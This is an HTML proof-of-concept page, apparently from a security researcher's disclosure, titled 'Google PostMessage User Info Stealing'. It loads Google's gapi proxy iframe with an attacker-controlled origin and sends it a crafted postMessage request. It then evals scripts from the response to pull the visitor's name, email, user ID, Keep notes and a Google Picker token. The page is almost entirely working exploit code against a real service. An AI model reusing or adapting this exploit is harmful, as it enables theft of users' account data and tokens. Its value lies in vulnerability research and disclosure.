
<!doctype html>
<html lang="en">
<head>
<title>Google PostMessage User Info Stealing</title>
<p>source from http://vinothsparrow.herokuapp.com/static/google-xss.html
https://youtu.be/x9sCZyB_kNQ
</p>
</head>
<script>
    function log(e) {
        document.getElementById('messages').innerHTML += e + "<br>";
    }
    var preloadUserInfo = () => {};
    var loadChunk = (e) => {
        console.log(e);
        if(e instanceof Array) {
            for (const note of e) {
                if(note.hasOwnProperty('text')){
                    log("Your note type:<b>"+note.type+"</b> text:<b>"+note.text+"</b>");
                }
                else if(note.hasOwnProperty('title')){
                    log("Your note type:<b>"+note.type+"</b> title:<b>"+note.title+"</b>");
                }
                else {
                    log("Your note type:<b>"+note.type+"</b>");
                }
            }
        }
    };
    function sendPayload(msg){
        let win = window.frames.iframe;
        win.postMessage(msg, '*');
    }
    function iframeOnLoad(){
        log("iframe https://keep-pa.clients6.google.com/static/proxy.html loaded");
        setTimeout(function(){
            log("sending payload to iframe");
            sendPayload(JSON.stringify({"s":"makeHttpRequests","f":"..","c":1,"a":[[{"key":"gapiRequest","params":{"url":"/","path":"/","httpMethod":"GET","headers":{},"urlParams":{},"root":"keep-pa.clients6.google.com","authType":"1p"}}]],"l":false,"g":true,t:"","r":".."}))
        }, 3000);
    }
    window.addEventListener("message",function(e) {
        log("received data from iframe");
        log("parsing the data from https://keep-pa.clients6.google.com/");
        var data = JSON.parse(e.data);
        if(data.s == "__cb"){
            var a = data.a[1];
            var res = JSON.parse(a);
            var body = res.gapiRequest.data.body;
            var parser = new DOMParser();
            var htmlDoc = parser.parseFromString(body, 'text/html');
            eval(htmlDoc.querySelectorAll('script')[0].text);
            var userId = _notes_flag_initialData.n_ui;
            var email = _notes_flag_initialData.n_ue;
            var name = htmlDoc.body.getElementsByClassName('gb_nb')[0].textContent;
            if(email == undefined || email ==""){
                email = htmlDoc.body.getElementsByClassName('gb_ob')[0].textContent;
                if(email == undefined || email ==""){
                    email = htmlDoc.body.getElementsByClassName('gb_3b')[0].textContent;
                }
            }
            log("Your name:<b>" + name + "</b> email:<b>"+email+"</b> Your userId:<b>"+userId+"</b>");
            eval(htmlDoc.querySelectorAll('script')[10].text);
            try{
                eval(htmlDoc.head.querySelectorAll('script')[1].text)
                var token = gbar_.CONFIG[0][6][35];
                log("Your https://docs.google.com/picker  token:<b>"+token+"</b>");
            }catch(e){}
            log("<code>" + body + "</code>");
        }
    });
</script>
<body>
    <div class="container">
        <pre>
        <h2>Google PostMessage User Info Stealing</h2>
        <div class="alert alert-info" id="messages"></div><br/>
        <iframe src="https://clients6.google.com/static/proxy.html?usegapi=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.gapi.en.7RphtNcGHDQ.O%2Fd%3D1%2Frs%3DAHpOoo_-zmYhp_Ir7_CCxM3l-AckMvaI9A%2Fm%3D__features__&rpctoken=342461366&parent=https://vinothsparrow.herokuapp.com&rpcUrl=https://vinothsparrow.herokuapp.com&origin=https://vinothsparrow.herokuapp.com" style="display:block; visibility:hidden" name="iframe" onload="iframeOnLoad();">
        </pre>
    </div>
</body>
</html>